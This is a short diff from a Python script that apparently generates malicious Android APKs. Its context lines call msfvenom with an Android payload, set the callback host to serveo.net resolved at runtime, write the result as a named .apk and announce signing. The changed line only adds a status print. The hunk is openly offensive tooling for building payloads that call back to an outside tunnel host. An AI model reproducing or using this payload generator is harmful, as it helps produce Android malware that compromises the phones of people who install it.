@@ -28,6 +28,7 @@ if payload_choice==1:
 	path=input("enter the path to save your payload : ")	
 	serv=socket.gethostbyname("serveo.net")
 	name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
+	print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
 	os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {path}/{name}.apk")
 	print("SIGNING YOUR APK>>>>>>...")
 	print("")
